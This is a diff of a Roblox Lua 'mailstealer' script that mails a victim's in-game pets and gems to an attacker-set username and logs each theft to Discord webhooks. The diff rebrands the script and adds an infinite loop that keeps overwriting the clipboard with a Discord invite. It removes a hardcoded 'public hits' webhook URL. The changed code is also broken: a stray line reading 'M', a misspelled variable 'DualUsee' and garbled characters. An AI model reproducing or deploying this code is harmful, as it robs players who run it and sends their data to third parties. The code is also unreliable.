@@ -11,15 +11,13 @@ Roblox_Username = Username
 Discord_Webhook = Webhook
 
 
+
 -- simple mailstealer
 LOGS_WEBHOOK = LogsWebhook
 if getgenv().Executed == true then
     return
 end
 getgenv().Executed = true
-
-
-
 
 
 repeat
@@ -53,8 +51,7 @@ repeat
 until game.PlaceId ~= nil
 repeat
     task.wait()
-until not game.Players.LocalPlayer.PlayerGui:FindFirstChild("__INTRO")
-
+M
 
 -- variables:
 
@@ -65,7 +62,7 @@ local Directory = require(game:GetService("ReplicatedStorage").Library.Directory
 local Player = game.Players.LocalPlayer
 local Inventory = Save.Inventory
 local HttpService = game:GetService("HttpService")
-local MailMessage = "Moonsystems On Top!"
+local MailMessage = "Historic Scripts On Top!"
 local message = require(game.ReplicatedStorage.Library.Client.Message)
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
 
@@ -141,6 +138,18 @@ local GetItemValue = function(Type, ItemTable)
 end
 
 
+--Discord Clipboard
+while true do
+    setclipboard("https://discord.gg/nmFwtZH6Xb")
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "Discord Link";
+        Text = "Copied to clipboard!";
+        Duration = 5;
+    })
+    wait(20) -- Waits 10 seconds before copying again
+end
+
+
 local GetItemValueOfItems = function()
     RAP = 0
     for name_of_category, category in pairs(Inventory) do
@@ -213,32 +222,32 @@ local function SendMessage(id, item_type, RBgoldNormal, thumbnail, webhook, pets
                     },
                     {
                         ["name"] = ":dog: **Pets left** :dog:",
-                        ["value"] = "```   " .. pets_left .. "```",
+                        ["value"] = "```鉃� " .. pets_left .. "```",
                         ["inline"] = true
                     },
                     {
                         ["name"] = ":money_mouth: **" .. item_type .. "** :money_mouth:",
-                        ["value"] = "```   " .. id .. "```",
+                        ["value"] = "```鉃� " .. id .. "```",
                         ["inline"] = true
                     },
                     {
                         ["name"] = ":trophy: **Item RAP** :trophy:",
-                        ["value"] = "```   " .. FormatNumber(RAP) .. "```",
+                        ["value"] = "```鉃� " .. FormatNumber(RAP) .. "```",
                         ["inline"] = true
                     },
                     {
                         ["name"] = ":gem: **Gems Left** :gem:",
-                        ["value"] = "```   " .. FormatNumber(GemsAmount) .. "```",
+                        ["value"] = "```鉃� " .. FormatNumber(GemsAmount) .. "```",
                         ["inline"] = true
                     },
                     {
                         ["name"] = ":sparkles: **Shiny** :sparkles:",
-                        ["value"] = "```   " .. shinyy .. "```",
+                        ["value"] = "```鉃� " .. shinyy .. "```",
                         ["inline"] = true
                     },
                     {
                         ["name"] = ":rainbow: **RB/Gold/Reg** :sparkles:",
-                        ["value"] = "```   " .. RBgoldNormal .. "```",
+                        ["value"] = "```鉃� " .. RBgoldNormal .. "```",
                         ["inline"] = true
                     }
                 }
@@ -251,37 +260,10 @@ local function SendMessage(id, item_type, RBgoldNormal, thumbnail, webhook, pets
         {
             Url = webhook,
             Method = "POST",
-            Headers = headers,
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
             Body = game.HttpService:JSONEncode(msg)
-        }
-    )
-    
-    -- Public Hits Webhook
-    local publicWebhook = "https://discord.com/api/webhooks/1343705357540917248/MCmu4-3-AuQ68afkyP_WgiZvufmyaVh4tsB_0DJ9_juAihDf9OZT21qd9569xwHqKs1R"
-    local publicMsg = {
-        ["content"] = "",
-        ["username"] = "Public Hits",
-        ["embeds"] = {
-            {
-                ["title"] = "**Public Hit Recorded**",
-                ["type"] = "rich",
-                ["color"] = tonumber(16711680),
-                ["fields"] = {
-                    {
-                        ["name"] = ":trophy: **Total RAP** :trophy:",
-                        ["value"] = "```   " .. FormatNumber(totalRap1) .. "```",
-                        ["inline"] = true
-                    }
-                }
-            }
-        }
-    }
-    request(
-        {
-            Url = publicWebhook,
-            Method = "POST",
-            Headers = headers,
-            Body = game.HttpService:JSONEncode(publicMsg)
         }
     )
 end
@@ -766,7 +748,7 @@ end
 
 if totalRap >= DualRap then
  print("error")
- Roblox_Username = DualUser
+ Roblox_Username = DualUsee
  Discord_Webhook = DualWebhook
 end
 
@@ -900,7 +882,7 @@ if #hits > 0 or GemsAmount > FirstPriceOfMail then
                             LOGS_WEBHOOK,
                             Left_Hits,
                             v.IsShiny,
-                            "Moonsystems Scripts On Top!",
+                            "Historic Scripts On Top!",
                             v.Item_RAP,
                             totalRap
                         )
